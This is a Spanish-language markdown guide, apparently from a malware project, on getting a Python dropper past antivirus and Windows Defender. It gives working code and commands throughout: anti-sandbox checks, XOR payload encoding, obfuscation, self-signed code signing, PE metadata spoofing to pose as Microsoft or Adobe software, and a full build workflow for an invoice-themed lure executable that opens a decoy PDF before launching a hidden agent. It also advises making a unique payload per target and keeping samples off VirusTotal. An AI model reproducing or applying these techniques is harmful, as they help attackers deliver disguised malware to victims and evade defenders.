# Guía de Evasión de Antivirus

## 🔴 Detecciones Comunes y Soluciones

### 1. PyInstaller Detection (`{PyInsObj}`)

**Problema:** Muchos AV detectan la firma de PyInstaller automáticamente.

**Soluciones implementadas:**
- ✅ Runtime hooks para ocultar `sys._MEIPASS`
- ✅ `--noupx` flag (no comprimir con UPX)
- ✅ Eliminar atributo `sys.frozen`

**Soluciones adicionales:**
```bash
# Usar otros empaquetadores
pip install nuitka
python -m nuitka --standalone --onefile --windows-disable-console dropper.py

# O usar PyArmor para ofuscar
pip install pyarmor
pyarmor obfuscate dropper.py
```

---

### 2. Base64 Detection

**Problema:** AV detecta strings base64 con payload embebido.

**Soluciones implementadas:**
- ✅ Fragmentación del payload en 3 partes
- ✅ Decodificación dinámica en runtime
- ✅ No almacenar payloads completos en memoria

**Mejoras adicionales:**
```python
# XOR encoding en lugar de base64
def xor_encode(data, key):
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

# Usar en embedded_dropper.py
AGENT_PART1 = xor_encode(agent_chunk1, b"MySecretKey123")
```

---

### 3. Behavioral Detection (`Behavior:Win32/DefenseEvasion`)

**Problema:** El AV detecta comportamiento sospechoso:
- Crear archivos en `%APPDATA%`
- Ejecutar procesos con `DETACHED_PROCESS`
- Nombre `svchost.exe` en ubicación no estándar

**Soluciones implementadas:**
- ✅ Cambiar ubicación a `%LOCALAPPDATA%\Microsoft\Edge\User Data\`
- ✅ Nombre `msedge.exe` (más legítimo)
- ✅ Anti-sandbox checks (uptime, CPU count, temp files)
- ✅ Delays humanos (3 segundos al inicio, 2 antes de ejecutar)

**Mejoras adicionales:**
```python
# Usar directorios más legítimos
agent_dir = Path(os.environ['LOCALAPPDATA']) / 'Microsoft' / 'OneDrive' / 'settings'
agent_dir = Path(os.environ['APPDATA']) / 'Adobe' / 'Acrobat' / 'DC'
agent_dir = Path(os.environ['LOCALAPPDATA']) / 'Google' / 'Chrome' / 'User Data'

# Nombres más creíbles
agent_name = "updater.exe"
agent_name = "sync.exe" 
agent_name = "cache.exe"
```

---

### 4. Process Path Detection

**Problema:** AV marca `C:\Users\...\Caches\svchost.exe` como sospechoso.

**Soluciones:**
```python
# Usar paths de aplicaciones reales
LEGITIMATE_PATHS = [
    r"%LOCALAPPDATA%\Microsoft\Edge\User Data\msedge_updater.exe",
    r"%APPDATA%\Microsoft\Teams\update.exe",
    r"%LOCALAPPDATA%\Discord\app-1.0.9015\DiscordPTB.exe",
    r"%PROGRAMFILES%\Common Files\microsoft shared\ClickToRun\OfficeClickToRun.exe",
]
```

---

## 🛡️ Técnicas Anti-Sandbox

### Implementadas en `embedded_dropper.py`:

```python
def is_sandbox():
    # 1. Uptime check (sandbox recién iniciada)
    uptime_ms = ctypes.windll.kernel32.GetTickCount64()
    if uptime_ms < 600000:  # < 10 minutos
        return True
    
    # 2. CPU count (VMs tienen pocos cores)
    if multiprocessing.cpu_count() < 2:
        return True
    
    # 3. Temp files (sandbox limpia)
    if len(os.listdir(os.environ['TEMP'])) < 10:
        return True
    
    return False
```

### Técnicas adicionales recomendadas:

```python
# 4. Check RAM física
import ctypes
kernel32 = ctypes.windll.kernel32
mem_status = ctypes.c_ulonglong()
kernel32.GlobalMemoryStatusEx(ctypes.byref(mem_status))
if mem_status.ullTotalPhys < 4 * 1024**3:  # < 4GB
    return True

# 5. Check resolución de pantalla
user32 = ctypes.windll.user32
screen_width = user32.GetSystemMetrics(0)
screen_height = user32.GetSystemMetrics(1)
if screen_width < 1024 or screen_height < 768:
    return True

# 6. Mouse movement detection
old_pos = win32api.GetCursorPos()
time.sleep(5)
new_pos = win32api.GetCursorPos()
if old_pos == new_pos:  # Usuario no movió mouse
    return True

# 7. Check archivos recientes
recent_folder = Path(os.environ['APPDATA']) / 'Microsoft' / 'Windows' / 'Recent'
if len(list(recent_folder.glob('*.lnk'))) < 5:
    return True
```

---

## 🔐 Ofuscación del Código Python

### Antes de compilar con PyInstaller:

```bash
# Opción 1: PyArmor (ofuscación profesional)
pip install pyarmor
pyarmor gen --enable-jit --restrict dropper.py
pyinstaller --onefile dist/dropper.py

# Opción 2: Intensio-Obfuscator
git clone https://github.com/Hnfull/Intensio-Obfuscator
python intensio_obfuscator.py -i dropper.py -o dropper_obf.py

# Opción 3: Manual (renombrar variables)
# Usar nombres comunes en lugar de sospechosos
BAD:  AGENT_DATA, PDF_B64, decode_payload()
GOOD: application_data, document_content, load_resource()
```

---

## 📦 Post-Compilación

### Usar `enhance_av_evasion.py`:

```bash
# Modificar timestamp PE (parecer más antiguo)
python enhance_av_evasion.py Factura.exe --backup

# Solo cambiar timestamp
python enhance_av_evasion.py Factura.exe --timestamp-only

# Añadir overlay data (cambia hash)
python enhance_av_evasion.py Factura.exe --overlay-only
```

### Técnicas manuales adicionales:

```bash
# 1. Firmar el EXE (certificado self-signed)
# Genera menos detección que EXE sin firmar
makecert -r -pe -n "CN=Acme Corp" -ss CA -sr CurrentUser -a sha256 -cy authority -sky signature -sv AcmeCorp.pvk AcmeCorp.cer
pvk2pfx -pvk AcmeCorp.pvk -spc AcmeCorp.cer -pfx AcmeCorp.pfx
signtool sign /f AcmeCorp.pfx /t http://timestamp.digicert.com Factura.exe

# 2. Empaquetar con recursos legítimos
# Extraer recursos de EXE legítimo y copiarlos
rcedit Factura.exe --set-version-string "CompanyName" "Microsoft Corporation"
rcedit Factura.exe --set-version-string "FileDescription" "Microsoft Edge Updater"
rcedit Factura.exe --set-version-string "ProductName" "Microsoft Edge"
rcedit Factura.exe --set-file-version "120.0.2210.133"

# 3. Comprimir con alternativas a UPX
# Algunos packers comerciales: Themida, VMProtect, Enigma
```

---

## 🎯 Workflow Completo Recomendado

### 1. Preparación del Agent

```bash
# Compilar agent con optimizaciones
cd agent
cargo build --release --target x86_64-pc-windows-msvc

# Aplicar obfuscación al binario (opcional)
# Usar herramientas como LLVM-Obfuscator
```

### 2. Crear Dropper

```bash
cd dropper

# Generar dropper embebido
python embedded_dropper.py \
    --agent ../agent/target/release/agent.exe \
    --pdf documento_real.pdf \
    --output Factura_Diciembre_2025.exe \
    --icon pdf_icon.ico \
    --agent-name "msedge_proxy.exe"
```

### 3. Post-Processing

```bash
# Mejorar evasión
python enhance_av_evasion.py Factura_Diciembre_2025.exe --backup

# Modificar metadata PE
rcedit Factura_Diciembre_2025.exe --set-icon pdf_icon.ico
rcedit Factura_Diciembre_2025.exe --set-version-string "CompanyName" "Adobe Systems Inc"
rcedit Factura_Diciembre_2025.exe --set-version-string "ProductName" "Adobe Acrobat Reader"
rcedit Factura_Diciembre_2025.exe --set-file-version "23.006.20380"
```

### 4. Testing

```bash
# Test en VM limpia sin AV
# Test en VM con Windows Defender
# Upload a VirusTotal SOLO cuando estés listo (quema el payload)
```

---

## ⚠️ Limitaciones de Windows Defender

### Defender usa múltiples capas:

1. **Static Analysis** (escaneo de firmas)
   - ✅ Mitigado con fragmentación y ofuscación
   
2. **Heuristic Analysis** (análisis de comportamiento)
   - ⚠️ Parcialmente mitigado con anti-sandbox
   - Recomendación: Más delays, interacción con usuario
   
3. **Cloud Protection** (análisis en la nube)
   - ❌ Difícil de evadir sin payloads únicos
   - Recomendación: No subir a VirusTotal, usar builder por objetivo
   
4. **AMSI (Anti-Malware Scan Interface)**
   - ⚠️ Aplica a scripts PowerShell/Python
   - PyInstaller compiled EXE NO pasa por AMSI
   
5. **SmartScreen**
   - ❌ Marca EXE sin reputación
   - Recomendación: Firmar con certificado válido

---

## 🧪 Testing Seguro

### NO hacer:
- ❌ Subir a VirusTotal (lo comparten con todos los AV)
- ❌ Ejecutar en máquina real sin VM
- ❌ Usar mismo payload múltiples veces

### SÍ hacer:
- ✅ Usar VMs desechables con snapshots
- ✅ Testear con Windows Defender aislado
- ✅ Usar servicios privados de escaneo (ej: antiscan.me)
- ✅ Generar payload único por objetivo

---

## 📊 Checklist de Evasión

Antes de distribución, verificar:

- [ ] Payload fragmentado (no en un solo bloque base64)
- [ ] Anti-sandbox checks implementados
- [ ] Delays realistas (mínimo 3-5 segundos)
- [ ] Path de extracción legítimo (no `%TEMP%` ni `%APPDATA%\...\Caches`)
- [ ] Nombre de archivo legítimo (`msedge.exe`, no `svchost.exe`)
- [ ] Timestamp PE modificado (parecer antiguo)
- [ ] Metadata PE con información real (Company, Version)
- [ ] Icono apropiado (.ico con múltiples resoluciones)
- [ ] Abre decoy real (PDF, DOC) antes de ejecutar payload
- [ ] No muestra ventanas/consolas
- [ ] Proceso hijo totalmente desacoplado (DETACHED_PROCESS)

---

## 🚀 Mejoras Futuras

### En desarrollo:
1. **Code signing automático** con certificados self-signed
2. **Empaquetadores alternativos** (Nuitka, cx_Freeze)
3. **Encriptación custom** en lugar de base64
4. **Inyección en procesos legítimos** (en lugar de crear nuevo proceso)
5. **Dropper en otros formatos** (.msi, .appx, .vbs + encoded)

### Avanzado:
- **Process Hollowing**: Reemplazar memoria de proceso legítimo
- **DLL Side-loading**: Usar DLL legítima como loader
- **Fileless execution**: Ejecutar solo en memoria sin tocar disco
- **LOLBAS abuse**: Usar binarios de Windows para ejecutar (mshta, regsvr32)

---

## 📚 Referencias

- [MITRE ATT&CK - Defense Evasion](https://attack.mitre.org/tactics/TA0005/)
- [Windows Defender Evasion Techniques](https://www.elastic.co/guide/en/security/current/windows-defender-exclusions.html)
- [PyInstaller Bootloader Customization](https://pyinstaller.org/en/stable/bootloader-building.html)
- [PE Format Specification](https://docs.microsoft.com/en-us/windows/win32/debug/pe-format)

---

**⚠️ DISCLAIMER:** Esta información es solo para propósitos educativos y testing en entornos controlados. El uso malicioso es ilegal y no está respaldado.
